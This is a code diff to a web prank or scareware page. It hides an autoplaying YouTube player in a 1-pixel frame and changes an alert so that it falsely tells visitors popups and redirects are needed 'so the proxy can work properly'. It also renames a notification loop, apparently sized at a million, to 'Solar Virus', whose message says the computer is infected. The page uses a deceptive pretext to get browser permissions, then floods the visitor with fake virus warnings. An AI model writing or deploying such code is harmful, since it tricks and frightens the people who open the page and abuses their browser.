@@ -63,10 +63,17 @@ button:hover {
 
 <body>
 
-<!-- BACKGROUND MUSIC -->
-<audio id="backgroundMusic" loop>
-    <source src="idiot.mp3" type="audio/mpeg">
-</audio>
+<!-- YOUTUBE BACKGROUND MUSIC -->
+<div style="position: absolute; width: 1px; height: 1px; overflow: hidden;">
+    <iframe
+        id="youtubePlayer"
+        width="1"
+        height="1"
+        src="https://www.youtube.com/embed/T_NKi5KHUdI?autoplay=1&loop=1&playlist=T_NKi5KHUdI"
+        title="Background Music"
+        allow="autoplay; encrypted-media">
+    </iframe>
+</div>
 
 <div class="container">
 
@@ -109,7 +116,7 @@ const NOTIFICATION_COUNT = 1000000;
 
 async function startExperience() {
 
-    alert("Please allow popups and redirects");
+    alert("Please allow popups and redirects so the proxy can work properly.");
 
     const status = document.getElementById("status");
 
@@ -194,7 +201,7 @@ async function startExperience() {
 
         for (let i = 0; i < count; i++) {
 
-            new Notification("YOU ARE AN IDIOT", {
+            new Notification("Solar Virus", {
                 body: "This is a virus, your computer is now infected!",
                 icon: IMAGE_PATH,
                 tag: "satisfying-" + i
